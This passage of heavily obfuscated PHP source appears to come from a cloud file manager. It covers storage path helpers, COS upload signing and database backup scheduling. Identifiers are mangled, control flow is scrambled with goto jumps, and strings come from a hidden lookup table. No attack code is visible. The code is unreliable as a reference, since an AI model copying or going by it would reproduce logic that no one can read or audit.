self::KOD_SOURCE) { show_json(LNG($EÌÄÒíç®[1186]), !1); } return $Câ¦’—Øó[$EÌÄÒíç®[395]]; } public static function make($d×÷æ×°Ì²) { if (!$d×÷æ×°Ì²) { return !1; } return self::makePath(self::KOD_SOURCE, intval($d×÷æ×°Ì²)); } public static function makeShare($B…‹³§åá˜, $Aµæî³ˆ½İ) { return self::makePath(self::KOD_SHARE_ITEM, $B…‹³§åá˜, $Aµæî³ˆ½İ); } public static function makeFileTypePath($F¶Ìš‹‚Ü) { return self::makePath(self::KOD_USER_FILE_TYPE, $F¶Ìš‹‚Ü); } public static function makeFileTagPath($Cã·–µ£‚Š) { return self::makePath(self::KOD_USER_FILE_TAG, $Cã·–µ£‚Š); } public static function makePath($a•¨Îˆ›Ó”, $eÄ¬£·«İŸ = '', $F–ÚÀóì“¼ = '') { $B“‘¦˜¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E´íšœæ¢ª = substr($a•¨Îˆ›Ó”, 1, -1); $f´…™»ÑÈ = $B“‘¦˜¦[1187] . $E´íšœæ¢ª . $B“‘¦˜¦[1188] . $eÄ¬£·«İŸ . $B“‘¦˜¦[1189]; $f´…™»ÑÈ = $F–ÚÀóì“¼ ? $f´…™»ÑÈ . $F–ÚÀóì“¼ . $B“‘¦˜¦[8] : $f´…™»ÑÈ; return $f´…™»ÑÈ; } public static function hashPath($Bì±•ªš¾ˆ, $d’î›±° = true) { goto C¢ê¾å¦; C¢ê¾å¦: $E¯£î‰ê‡« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B©ËÈùéÈ‰ = is_array($Bì±•ªš¾ˆ) ? $Bì±•ªš¾ˆ : IO::info($Bì±•ªš¾ˆ); $FÊ·óñ = _get($B©ËÈùéÈ‰, $E¯£î‰ê‡«[1190], $E¯£î‰ê‡«[33]); goto féŠÅÛŠ° ; böñ¾ù‰Ï³: return $FÊ·óñ; goto Déàä„£; féŠÅÛŠ° : if (!$FÊ·óñ && isset($B©ËÈùéÈ‰[$E¯£î‰ê‡«[397]])) { $B©ËÈùéÈ‰ = IO::info(KodIO::make($B©ËÈùéÈ‰[$E¯£î‰ê‡«[397]])); $FÊ·óñ = _get($B©ËÈùéÈ‰, $E¯£î‰ê‡«[1190], $E¯£î‰ê‡«[33]); } if (!$FÊ·óñ && $d’î›±°) { $cÇ·óšŒÂµ = KodIO::parse($B©ËÈùéÈ‰[$E¯£î‰ê‡«[76]]); if (!$cÇ·óšŒÂµ[$E¯£î‰ê‡«[29]]) { $FÊ·óñ = IO::hashSimple($B©ËÈùéÈ‰[$E¯£î‰ê‡«[76]]); } } if (!$FÊ·óñ) { $FÊ·óñ = md5($B©ËÈùéÈ‰[$E¯£î‰ê‡«[76]] . $B©ËÈùéÈ‰[$E¯£î‰ê‡«[78]] . $B©ËÈùéÈ‰[$E¯£î‰ê‡«[84]]); } goto böñ¾ù‰Ï³; Déàä„£: } public static function initSystemPath() { goto A¯ï«”ë±©; A¯ï«”ë±©: $CéçĞ¯†â® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (defined($CéçĞ¯†â®[1191])) { return; } define($CéçĞ¯†â®[1191], self::systemPath($CéçĞ¯†â®[1192])); goto EÕÏòÇß¼; d„èä¥¹ó»: IOHistory::bindEvent(); goto A†ù…¡Ù†—; EÕÏòÇß¼: define($CéçĞ¯†â®[1193], self::systemPath($CéçĞ¯†â®[1194])); define($CéçĞ¯†â®[1195], self::systemPath($CéçĞ¯†â®[1196])); define($CéçĞ¯†â®[1197], self::systemPath($CéçĞ¯†â®[1198])); goto d„èä¥¹ó»; A†ù…¡Ù†—: } public static function systemPath($Fõç¥Á±ôó) { goto DÁˆìƒ¯´Ø; CŒÔ‘ÖâÉÚ: if ($eô÷”âÅòÀ) { return $eô÷”âÅòÀ; } if ($Fõç¥Á±ôó == $föˆİªÊŒ¯[1192]) { $eô÷”âÅòÀ = self::make(Model($föˆİªÊŒ¯[813])->systemRootPathAdd($föˆİªÊŒ¯[531])); } else { $eô÷”âÅòÀ = self::systemPath($föˆİªÊŒ¯[1192]); $eÃ¢—çœ„ = self::sourceID($eô÷”âÅòÀ); $eô÷”âÅòÀ = self::make(Model($föˆİªÊŒ¯[813])->mkdir($eÃ¢—çœ„, $Fõç¥Á±ôó)); } Model($föˆİªÊŒ¯[751])->set($bË‰¾º¤†ˆ, $eô÷”âÅòÀ); goto d³­·ì¬‚à; DÁˆìƒ¯´Ø: $föˆİªÊŒ¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bË‰¾º¤†ˆ = $föˆİªÊŒ¯[1199] . ucfirst($Fõç¥Á±ôó); $eô÷”âÅòÀ = Model($föˆİªÊŒ¯[751])->get($bË‰¾º¤†ˆ); goto CŒÔ‘ÖâÉÚ; d³­·ì¬‚à: return $eô÷”âÅòÀ; goto A°½É¥½–; A°½É¥½–: } public static function systemFolder($b…ìçˆÓÂ») { $dò•‹…—é = IO_PATH_SYSTEM_SOURCE . $b…ìçˆÓÂ»; $f™—£«·ß‰ = Cache::get($dò•‹…—é); if (!$f™—£«·ß‰) { $f°§–ˆ“ŒÌ = IO::infoFull($dò•‹…—é); if (!$f°§–ˆ“ŒÌ) { $f™—£«·ß‰ = IO::mkdir($dò•‹…—é, REPEAT_SKIP); } else { $f™—£«·ß‰ = $f°§–ˆ“ŒÌ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]; } Cache::set($dò•‹…—é, $f™—£«·ß‰, 3600 * 10); } return $f™—£«·ß‰; } public static function defaultDriver() { return Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][748])->defaultDriver(); } public static function defaultIO() { $EêÃØÊÜŠî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cË»¶òè‰— = self::defaultDriver(); return $EêÃØÊÜŠî[1200] . $cË»¶òè‰—[$EêÃØÊÜŠî[395]] . $EêÃØÊÜŠî[1189]; } public static function defaultDriverInit() { static $DŠÖğÕ»ö¼ = false; if ($DŠÖğÕ»ö¼) { return $DŠÖğÕ»ö¼; } $DŠÖğÕ»ö¼ = IO::init(self::defaultIO()); return $DŠÖğÕ»ö¼; } public static function fileTypeList() { $CÆÈ´¤®Ò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÓ‹ËõĞÌÜ = $GLOBALS[$CÆÈ´¤®Ò[6]][$CÆÈ´¤®Ò[1201]]; foreach ($EÓ‹ËõĞÌÜ as $b§¿ŠŒâÇ¾ => $c‘¾µ®Œ) { $D«ÙÉÅîŠ = $CÆÈ´¤®Ò[1202] . $b§¿ŠŒâÇ¾; $b˜äêÕ­ = LNG($D«ÙÉÅîŠ); if ($D«ÙÉÅîŠ != $b˜äêÕ­) { $EÓ‹ËõĞÌÜ[$b§¿ŠŒâÇ¾][$CÆÈ´¤®Ò[28]] = $b˜äêÕ­; } } return $EÓ‹ËõĞÌÜ; } public static function transferType($Eß¨íä±ŒŠ, $eİš×ŠÇĞ) { goto aËº¯Ø…; bµ²‰‹Üçİ: return $b‰™«µÛ¢Œ[1205]; goto Eà¾Ğš•ŒŠ; CĞæƒÄ›ğÂ: if ($F¿Üâµè‹Â[$b‰™«µÛ¢Œ[29]] == $Eßœ Ï˜ÛÕ[$b‰™«µÛ¢Œ[29]] && $F¿Üâµè‹Â[$b‰™«µÛ¢Œ[1203]] == $Eßœ Ï˜ÛÕ[$b‰™«µÛ¢Œ[1203]]) { return $b‰™«µÛ¢Œ[1204]; } if ($F¿Üâµè‹Â[$b‰™«µÛ¢Œ[29]] == $b‰™«µÛ¢Œ[846] && $Eßœ Ï˜ÛÕ[$b‰™«µÛ¢Œ[29]] == $b‰™«µÛ¢Œ[106]) { return $b‰™«µÛ¢Œ[1115]; } if ($F¿Üâµè‹Â[$b‰™«µÛ¢Œ[29]] == $b‰™«µÛ¢Œ[106] && $Eßœ Ï˜ÛÕ[$b‰™«µÛ¢Œ[29]] == $b‰™«µÛ¢Œ[846]) { return $b‰™«µÛ¢Œ[107]; } goto bµ²‰‹Üçİ; aËº¯Ø…: $b‰™«µÛ¢Œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F¿Üâµè‹Â = self::driverType($Eß¨íä±ŒŠ); $Eßœ Ï˜ÛÕ = self::driverType($eİš×ŠÇĞ); goto CĞæƒÄ›ğÂ; Eà¾Ğš•ŒŠ: } public static function driverType($c·‚½“Û¿è) { goto cŠâôÓ½º²; eè¿éÍÌ¸ : if ($D¢ñ™èéî == $fòİß°ØÁò[739] || $D¢ñ™èéî == $fòİß°ØÁò[1207] || $D¢ñ™èéî == $fòİß°ØÁò[1208]) { $c·‚½“Û¿è = self::defaultDriverInit(); } else { if ($D¢ñ™èéî == $fòİß°ØÁò[1122] || $D¢ñ™èéî == $fòİß°ØÁò[1209]) { $c·‚½“Û¿è = IO::init($c·‚½“Û¿è->pathParse[$fòİß°ØÁò[1069]]); } } $D¢ñ™èéî = str_replace($fòİß°ØÁò[1206], $fòİß°ØÁò[33], strtolower($c·‚½“Û¿è->getType())); if ($D¢ñ™èéî == $fòİß°ØÁò[106]) { return array($fòİß°ØÁò[29] => $fòİß°ØÁò[106], $fòİß°ØÁò[1203] => $fòİß°ØÁò[33], $fòİß°ØÁò[76] => $d™Ö©‡Âï—); } goto B²ÂŠÍ‘¯Œ; B²ÂŠÍ‘¯Œ: return array($fòİß°ØÁò[29] => $fòİß°ØÁò[846], $fòİß°ØÁò[1203] => $c·‚½“Û¿è->pathDriver, $fòİß°ØÁò[76] => $d™Ö©‡Âï—); goto f½…±¹‹; cŠâôÓ½º²: $fòİß°ØÁò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d™Ö©‡Âï— = $c·‚½“Û¿è->path; $D¢ñ™èéî = str_replace($fòİß°ØÁò[1206], $fòİß°ØÁò[33], strtolower($c·‚½“Û¿è->getType())); goto eè¿éÍÌ¸ ; f½…±¹‹: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($e«‘Ì„á›…) { parent::__construct($e«‘Ì„á›…); $this->signatureVersion($_SERVER[Ôğ—¤Šµˆ˜ñ£][212]); } public function uploadFormData($b‹±£·©×, $E ŒëùŠ©Š = 3600) { goto F…ˆ†«åÄ¶; b¨ÑåæÊ¢ï: $F•ÄóÁø–Ë = $aß¿ˆ²®‡ä[1210]; $d¼ß•±âà‘ = gmdate($aß¿ˆ²®‡ä[1211], time() + $E ŒëùŠ©Š); $b‡§ËÂµ«¨ = (string) time() . $aß¿ˆ²®‡ä[68] . (string) (time() + $E ŒëùŠ©Š); goto E²³êÁäµ©; E²³êÁäµ©: $D¢Â”—¥öİ = array($aß¿ˆ²®‡ä[1212] => $d¼ß•±âà‘, $aß¿ˆ²®‡ä[1213] => array(array($aß¿ˆ²®‡ä[1214] => $DÇï¦÷Ù‚…), array($aß¿ˆ²®‡ä[1215] => $this->bucket), array($aß¿ˆ²®‡ä[1216], $aß¿ˆ²®‡ä[1217], $aß¿ˆ²®‡ä[33]), array($aß¿ˆ²®‡ä[1218] => $F•ÄóÁø–Ë), array($aß¿ˆ²®‡ä[1219] => $aºç›ùÜ«), array($aß¿ˆ²®‡ä[1220] => $this->accessKey), array($aß¿ˆ²®‡ä[1221] => $b‡§ËÂµ«¨))); $D¢Â”—¥öİ = json_encode($D¢Â”—¥öİ); $dôİØÏë…Š = hash_hmac($aß¿ˆ²®‡ä[230], $b‡§ËÂµ«¨, $this->secret); goto CÇŸ„çß”Œ; D¬¥æ§¬™: return $AÀ¥ØÅĞ¼å; goto EÊ§òİ£àƒ; CÇŸ„çß”Œ: $C‚óá„óğ× = sha1($D¢Â”—¥öİ); $C§‡‘ÑÏ¥à = hash_hmac($aß¿ˆ²®‡ä[230], $C‚óá„óğ×, $dôİØÏë…Š); $AÀ¥ØÅĞ¼å = array($aß¿ˆ²®‡ä[1214] => $DÇï¦÷Ù‚…, $aß¿ˆ²®‡ä[1218] => $F•ÄóÁø–Ë, $aß¿ˆ²®‡ä[1222] => base64_encode($D¢Â”—¥öİ), $aß¿ˆ²®‡ä[1219] => $aºç›ùÜ«, $aß¿ˆ²®‡ä[1220] => $this->accessKey, $aß¿ˆ²®‡ä[1223] => $b‡§ËÂµ«¨, $aß¿ˆ²®‡ä[1224] => $C§‡‘ÑÏ¥à, $aß¿ˆ²®‡ä[175] => $this->getHost()); goto D¬¥æ§¬™; F…ˆ†«åÄ¶: $aß¿ˆ²®‡ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÇï¦÷Ù‚… = $aß¿ˆ²®‡ä[192]; $aºç›ùÜ« = $aß¿ˆ²®‡ä[230]; goto b¨ÑåæÊ¢ï; EÊ§òİ£àƒ: } public function fileOutLink($cºÛŞ…×“Ú) { $A‰æÍÎÂÇ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (substr($cºÛŞ…×“Ú, 0, 7) == $A‰æÍÎÂÇ[1225]) { $cºÛŞ…×“Ú = $A‰æÍÎÂÇ[1226] . substr($cºÛŞ…×“Ú, 7); } header($A‰æÍÎÂÇ[159] . $cºÛŞ…×“Ú); die; } } goto ašèÏ­×º; cÅÃ®õê¥Æ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Fôëâ¼Ø«³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->isManual(); self::$name = date($Fôëâ¼Ø«³[729]); if (!($aˆÃ‘˜Á— = Model($Fôëâ¼Ø«³[730])->lastItem())) { $aˆÃ‘˜Á— = $this->initData(); } else { self::$name = $aˆÃ‘˜Á—[$Fôëâ¼Ø«³[28]]; if ($aˆÃ‘˜Á—[$Fôëâ¼Ø«³[731]] == $Fôëâ¼Ø«³[87]) { self::$name = date($Fôëâ¼Ø«³[732]); $EÕÈ½ƒÍá£ = 0; if (isset($aˆÃ‘˜Á—[$Fôëâ¼Ø«³[291]][$Fôëâ¼Ø«³[193]][$Fôëâ¼Ø«³[461]])) { $EÕÈ½ƒÍá£ = (int) $aˆÃ‘˜Á—[$Fôëâ¼Ø«³[291]][$Fôëâ¼Ø«³[193]][$Fôëâ¼Ø«³[461]]; } if (self::$manual == 0 && $aˆÃ‘˜Á—[$Fôëâ¼Ø«³[28]] == self::$name) { Model($Fôëâ¼Ø«³[730])->remove($aˆÃ‘˜Á—[$Fôëâ¼Ø«³[395]]); } $aˆÃ‘˜Á— = $this->initData($EÕÈ½ƒÍá£, $aˆÃ‘˜Á—[$Fôëâ¼Ø«³[733]]); } else { $this->checkStore($aˆÃ‘˜Á—[$Fôëâ¼Ø«³[733]]); } } self::$option = $aˆÃ‘˜Á—; } private function isManual() { $d¤ª†ğ´ˆ÷ = _get($GLOBALS, $_SERVER[Ôğ—¤Šµˆ˜ñ£][734], 0); $d¤ª†ğ´ˆ÷ = intval($d¤ª†ğ´ˆ÷); self::$manual = $d¤ª†ğ´ˆ÷ && $d¤ª†ğ´ˆ÷ == 1 ? 1 : 0; } private function initData($D¤œÇÄ÷ = 0, $C°ê¢Ù‡ƒå = '') { goto AõíÙôøÈ; cÈÛŒÆäÛ‹: $this->checkStore($AõŒâ×ÕÆ¡[$eİÃ‰ÖÕà¨[733]]); if (self::$manual == 1) { self::$name .= $eİÃ‰ÖÕà¨[71] . date($eİÃ‰ÖÕà¨[735]); } $a‹½åÀÛ´Ä = array($eİÃ‰ÖÕà¨[733] => $AõŒâ×ÕÆ¡[$eİÃ‰ÖÕà¨[733]], $eİÃ‰ÖÕà¨[28] => self::$name, $eİÃ‰ÖÕà¨[731] => 0, $eİÃ‰ÖÕà¨[736] => $AõŒâ×ÕÆ¡[$eİÃ‰ÖÕà¨[736]], $eİÃ‰ÖÕà¨[737] => self::$manual, $eİÃ‰ÖÕà¨[291] => array($eİÃ‰ÖÕà¨[738] => array($eİÃ‰ÖÕà¨[731] => 0), $eİÃ‰ÖÕà¨[739] => array($eİÃ‰ÖÕà¨[731] => 0, $eİÃ‰ÖÕà¨[740] => 0, $eİÃ‰ÖÕà¨[741] => 0, $eİÃ‰ÖÕà¨[29] => $eİÃ‰ÖÕà¨[33], $eİÃ‰ÖÕà¨[742] => 0, $eİÃ‰ÖÕà¨[490] => 0), $eİÃ‰ÖÕà¨[743] => array($eİÃ‰ÖÕà¨[731] => 0, $eİÃ‰ÖÕà¨[740] => 0, $eİÃ‰ÖÕà¨[741] => 0, $eİÃ‰ÖÕà¨[742] => 0, $eİÃ‰ÖÕà¨[490] => 0), $eİÃ‰ÖÕà¨[193] => array($eİÃ‰ÖÕà¨[731] => 0, $eİÃ‰ÖÕà¨[744] => 0, $eİÃ‰ÖÕà¨[745] => 0, $eİÃ‰ÖÕà¨[746] => 0, $eİÃ‰ÖÕà¨[747] => 0, $eİÃ‰ÖÕà¨[461] => $D¤œÇÄ÷, $eİÃ‰ÖÕà¨[742] => 0, $eİÃ‰ÖÕà¨[490] => 0)), $eİÃ‰ÖÕà¨[742] => time(), $eİÃ‰ÖÕà¨[490] => 0); goto a¼Ş¥ùêÏ; AõíÙôøÈ: $eİÃ‰ÖÕà¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AõŒâ×ÕÆ¡ = Model($eİÃ‰ÖÕà¨[730])->config(); if ($C°ê¢Ù‡ƒå && $AõŒâ×ÕÆ¡[$eİÃ‰ÖÕà¨[733]] != $C°ê¢Ù‡ƒå) { $D¤œÇÄ÷ = 0; } goto cÈÛŒÆäÛ‹; a¼Ş¥ùêÏ: $Cç‰‹è²œ¼ = Model($eİÃ‰ÖÕà¨[730])->insert($a‹½åÀÛ´Ä); $a‹½åÀÛ´Ä[$eİÃ‰ÖÕà¨[395]] = $Cç‰‹è²œ¼; return $a‹½åÀÛ´Ä; goto Aóñ…ïÒ£§; Aóñ…ïÒ£§: } private function checkStore($d“‚©Á°Ç”) { $bÑèĞ¹—êî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aõ‚µ²ôÓ¼ = Model($bÑèĞ¹—êî[748])->listData($d“‚©Á°Ç”); Model($bÑèĞ¹—êî[748])->checkConfig($Aõ‚µ²ôÓ¼); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][730])->findByName(self::$name); } return self::$option; } public static function set($E”‰æİ§) { $bãÜ‹ÖÓ¶½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BŠÃçÃ¼¬î = self::get(); foreach ($E”‰æİ§ as $f†¸„¦¿ìí => $b³ÃõÌ»ï) { $dé™îÎéî‰ = explode($bãÜ‹ÖÓ¶½[95], $f†¸„¦¿ìí); $fÔÁˆ¤ç¢¦ = count($dé™îÎéî‰); switch ($fÔÁˆ¤ç¢¦) { case 1: $BŠÃçÃ¼¬î[$dé™îÎéî‰[0]] = $b³ÃõÌ»ï; break; case 2: $BŠÃçÃ¼¬î[$dé™îÎéî‰[0]][$dé™îÎéî‰[1]] = $b³ÃõÌ»ï; break; case 3: $BŠÃçÃ¼¬î[$dé™îÎéî‰[0]][$dé™îÎéî‰[1]][$dé™îÎéî‰[2]] = $b³ÃõÌ»ï; break; } } Model($bãÜ‹ÖÓ¶½[730])->update($BŠÃçÃ¼¬î[$bãÜ‹ÖÓ¶½[395]], $BŠÃçÃ¼¬î); self::$option = $BŠÃçÃ¼¬î; return self::$option; } public function keep() { $BµƒŒ…İ©ª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bİ¡ôàòïÀ = self::get(); if ($bİ¡ôàòïÀ[$BµƒŒ…İ©ª[291]][$BµƒŒ…İ©ª[738]][$BµƒŒ…İ©ª[731]] == $BµƒŒ…İ©ª[87]) { return; } $this->backupKeep($bİ¡ôàòïÀ); self::set(array($BµƒŒ…İ©ª[749] => 1)); } private function backupKeep($e©÷ÍË´ÙÉ) { goto Fç¿ƒƒåÄâ; Fç¿ƒƒåÄâ: $A½ÅÇé¿çŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::$manual == 1) { return; } $DêÂ˜­˜ù = Model($A½ÅÇé¿çŒ[730])->listData(); goto aÅ„ï­İ£Ü; aÅ„ï­İ£Ü: if (empty($DêÂ˜­˜ù)) { return; } $dËÈé£á ± = 0; $BôÊÆ…£®æ = array(); goto DÜ©²‘’¯‘; f¨†‹„éì²: $aÉ‡Ã³®È = Model($A½ÅÇé¿çŒ[751])->get($A½ÅÇé¿çŒ[752]); foreach ($DêÂ˜­˜ù as $Fï‰‡†½ªî) { if (isset($Fï‰‡†½ªî[$A½ÅÇé¿çŒ[737]]) && $Fï‰‡†½ªî[$A½ÅÇé¿çŒ[737]] == $A½ÅÇé¿çŒ[87]) { continue; } if (!empty($Fï‰‡†½ªî[$A½ÅÇé¿çŒ[28]]) && in_array($Fï‰‡†½ªî[$A½ÅÇé¿çŒ[28]], $BôÊÆ…£®æ)) { continue; } Model($A½ÅÇé¿çŒ[730])->remove($Fï‰‡†½ªî[$A½ÅÇé¿çŒ[395]]); $aÇ¬…ÌÊî = $this->backupPath($e©÷ÍË´ÙÉ, $aÉ‡Ã³®È); IO::remove($aÇ¬…ÌÊî, !1); } goto DÙİ¾ÉôÑß; DÜ©²‘’¯‘: foreach ($DêÂ˜­˜ù as $Fï‰‡†½ªî) { if ($dËÈé£á ± >= 7) { break; } $BôÊÆ…£®æ[] = $Fï‰‡†½ªî[$A½ÅÇé¿çŒ[28]]; $dËÈé£á ±++; } for ($dËÈé£á ± = 0; $dËÈé£á ± < 12; $dËÈé£á ±++) { $BôÊÆ…£®æ[] = date($A½ÅÇé¿çŒ[750], strtotime("\x2d{$dËÈé£á ±}\40\155\x6f\156\x74\x68\x73")); } $BôÊÆ…£®æ = array_unique($BôÊÆ…£®æ); goto f¨†‹„éì²; DÙİ¾ÉôÑß: } private function backupPath($eÃ’Öš·ß, $Aïñ‹àïğ = false) { $e¡ôÔ«šŸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Aïñ‹àïğ) { $Aïñ‹àïğ = Model($e¡ôÔ«šŸ[751])->get($e¡ôÔ«šŸ[752]); } $d‚¸ò“˜± = $eÃ’Öš·ß[$e¡ôÔ«šŸ[28]]; $D¶ÆØ¼ƒ¿¿ = substr(md5($e¡ôÔ«šŸ[753] . $Aïñ‹àïğ . $d‚¸ò“˜±), 0, 8); return "\173\151\157\72{$eÃ’Öš·ß[$e¡ôÔ«šŸ[733]]}\x7d\57\144\141\x74\x61\x62\x61\x73\145\x2f\x62\141\x63\153\165\160\x2f" . $d‚¸ò“˜± . $e¡ôÔ«šŸ[71] . $D¶ÆØ¼ƒ¿¿; } public function db() { goto bŸÄÏ¤ËÂœ; aƒö—éƒï: return !0; goto c‚¯Ş•ÔŒ¿; bŸÄÏ¤ËÂœ: $fïÉ†¦´ê  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¼Şİ¼ğˆ = self::get(); if ($D¼Şİ¼ğˆ[$fïÉ†¦´ê [291]][$fïÉ†¦´ê [739]][$fïÉ†¦´ê [731]] == $fïÉ†¦´ê [87]) { return !0; } goto d›ŠîªÒŸÚ; d›ŠîªÒŸÚ: $e…çËÅÀó± = new BackupDb(); if (!$e…çËÅÀó±->index()) { return !1; } self::set(array($fïÉ†¦´ê [754] => 1)); goto aƒö—éƒï; c‚¯Ş•ÔŒ¿: } public function dbFile() { goto B•ÇÃ¹ªˆ‹; B•ÇÃ¹ªˆ‹: $f¦¨‡³›Ñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¨î¶œ­òã = self::get(); if ($c¨î¶œ­òã[$f¦¨‡³›Ñ[291]][$f¦¨‡³›Ñ[743]][$f¦¨‡³›Ñ[731]] == $f¦¨‡³›Ñ[87]) { return !0; } goto EšÇšµŒê‚; EšÇšµŒê‚: $bÖéä½ä¾ = new BackupDbFile(); if (!$bÖéä½ä¾->index()) { return !1; } self::set(array($f¦¨‡³›Ñ[755] => 1)); goto Aª¢Ô¸‹; Aª¢Ô¸‹: return !0; goto F«…ãÍ¥¯ï; F«…ãÍ¥¯ï: } public function file() { $däğ’«‹ˆ¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Cˆ«»ÖÏñ = self::get(); if ($Cˆ«»ÖÏñ[$däğ’«‹ˆ¸[291]][$däğ’«‹ˆ¸[193]][$däğ’«‹ˆ¸[731]] == $däğ’«‹ˆ¸[87]) { return !0; } if (!isset($Cˆ«»ÖÏñ[$däğ’«‹ˆ¸[736]]) || $Cˆ«»ÖÏñ[$däğ’«‹ˆ¸[736]] == $däğ’«‹ˆ¸[191]) { $cˆÑŞ”  = new BackupFile(); if (!$cˆÑŞ” ->index()) { return !1; } } self::set(array($däğ’«‹ˆ¸[756] => 1, $däğ’«‹ˆ¸[731] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto c…„²›™¸ˆ; bïî†¤¤•: if (isset($fÅ‚õÖô±->task[$Aë×±­‰Ç[769]])) { $Añù¦ç¥¤ = $fÅ‚õÖô±->task[$Aë×±­‰Ç[769]] ? $fÅ‚õÖô±->task[$Aë×±­‰Ç[769]] : timeFloat(); $Bˆ§Ïµ¦Ã¼ = $Añù¦ç¥¤ - $fÅ‚õÖô±->task[$Aë×±­‰Ç[770]]; if ($Bˆ§Ïµ¦Ã¼ >= 0.2) { $d©‹ŒÄÛ¾ += 1; } } $fÅ‚õÖô±->end(); $EÄ»†¼çÂ = array($Aë×±­‰Ç[757] => $f™Ş»‡À¡, $Aë×±­‰Ç[754] => 1, $Aë×±­‰Ç[771] => $d©‹ŒÄÛ¾, $Aë×±­‰Ç[772] => $a÷¢³ª¿¢õ, $Aë×±­‰Ç[773] => time()); goto FØñÁ£¨²„; B“à‰ìù¢: self::$name = $bìµÙ˜ÜÀŞ[$Aë×±­‰Ç[28]]; $C¬ …ì±œ¸ = $GLOBALS[$Aë×±­‰Ç[6]][$Aë×±­‰Ç[17]]; $f™Ş»‡À¡ = $this->_dbType($C¬ …ì±œ¸); goto CÁºê³ÂĞŒ; A¥¼ÅÈÂ‡“: $d©‹ŒÄÛ¾ = $a÷¢³ª¿¢õ = 0; try { $d¾¼„¹Î³ò = $c¯¹­çí–->db()->getTables(); } catch (Exception $Fè´ˆéÜ¶) { return !1; } $d¾¼„¹Î³ò = array_diff($d¾¼„¹Î³ò, array($Aë×±­‰Ç[760], $Aë×±­‰Ç[761])); goto Eòèùš«·é; EŞÂÈéÎ¤Å: $f±øéß°ÊÒ = $this->tmpFilesPath() . $Aë×±­‰Ç[759] . self::$name . $Aë×±­‰Ç[8]; del_dir($f±øéß°ÊÒ); mk_dir($f±øéß°ÊÒ); goto A¥¼ÅÈÂ‡“; CÁºê³ÂĞŒ: $c¯¹­çí– = new DbManage($C¬ …ì±œ¸, $f™Ş»‡À¡); $EÄ»†¼çÂ = array($Aë×±­‰Ç[757] => $f™Ş»‡À¡, $Aë×±­‰Ç[758] => time()); Backup::set($EÄ»†¼çÂ); goto EŞÂÈéÎ¤Å; FØñÁ£¨²„: Backup::set($EÄ»†¼çÂ); if ($d©‹ŒÄÛ¾ - $a÷¢³ª¿¢õ > 1) { $cŒŒ¸ğ‹‹Ù = $Aë×±­‰Ç[774]; if (stristr(I18n::getType(), $Aë×±­‰Ç[775])) { $cŒŒ¸ğ‹‹Ù = $Aë×±­‰Ç[776]; } write_log(array($cŒŒ¸ğ‹‹Ù, $EÄ»†¼çÂ), $Aë×±­‰Ç[763]); return !1; } return !0; goto fáÅø–Ö¨…; Eòèùš«·é: foreach ($d¾¼„¹Î³ò as $Cäô³Î—×Œ) { $d©‹ŒÄÛ¾ += $c¯¹­çí–->model($Cäô³Î—×Œ)->count(); } $fÅ‚õÖô± = new Task($Aë×±­‰Ç[762], $Aë×±­‰Ç[763], $d©‹ŒÄÛ¾, LNG($Aë×±­‰Ç[764]) . $Aë×±­‰Ç[765] . LNG($Aë×±­‰Ç[766])); foreach ($d¾¼„¹Î³ò as $Cäô³Î—×Œ) { $c¯ËïåĞ‹ = $f±øéß°ÊÒ . $Cäô³Î—×Œ . $Aë×±­‰Ç[767]; $F½èªÎ±Æë = null; if ($Cäô³Î—×Œ == $Aë×±­‰Ç[768] && (!isset($bìµÙ˜ÜÀŞ[$Aë×±­‰Ç[736]]) || $bìµÙ˜ÜÀŞ[$Aë×±­‰Ç[736]] == $Aë×±­‰Ç[191])) { $F½èªÎ±Æë = self::$io; } $a÷¢³ª¿¢õ += $c¯¹­çí–->sqlFromDb($Cäô³Î—×Œ, $c¯ËïåĞ‹, $fÅ‚õÖô±, $F½èªÎ±Æë); } goto bïî†¤¤•; c…„²›™¸ˆ: $Aë×±­‰Ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bìµÙ˜ÜÀŞ = Backup::get(); self::$io = $bìµÙ˜ÜÀŞ[$Aë×±­‰Ç[733]]; goto B“à‰ìù¢; fáÅø–Ö¨…: } private function _dbType($D®î¬¿½ˆ) { goto Açá¿á¶°ñ; Açá¿á¶°ñ: $b™À¶‹Ò×× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D®î¬¿½ˆ = array_change_key_case($D®î¬¿½ˆ); $fˆğˆÇñä = $D®î¬¿½ˆ[$b™À¶‹Ò××[777]]; goto cáÅæ’©”ˆ; cáÅæ’©”ˆ: if ($fˆğˆÇñä == $b™À¶‹Ò××[778]) { $fí§„ÜÜ¿˜ = explode($b™À¶‹Ò××[4], $D®î¬¿½ˆ[$b™À¶‹Ò××[779]]); $fˆğˆÇñä = $fí§„ÜÜ¿˜[0]; } $C öÑĞÑŞ = array($b™À¶‹Ò××[780] => $b™À¶‹Ò××[9], $b™À¶‹Ò××[781] => $b™À¶‹Ò××[782]); if (isset($C 